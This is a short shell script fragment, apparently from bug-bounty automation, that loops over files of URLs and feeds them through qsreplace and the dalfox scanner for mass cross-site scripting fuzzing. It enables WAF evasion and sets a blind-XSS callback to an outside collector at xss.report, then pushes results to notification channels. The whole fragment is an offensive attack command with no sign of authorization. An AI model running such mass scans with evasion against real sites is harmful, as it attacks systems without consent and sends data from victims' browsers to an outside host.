...
for file in small_file*; do
    ...
    cat "$file" | qsreplace FUZZ | dalfox pipe -S --waf-evasion --skip-mining-all --skip-headless --mass -b https://xss.report/c/spyak47 -o results.tmp && cat results.tmp | notify -silent -id Confidential-Exif1,Confidential-Exif2 | anew results.txt
done
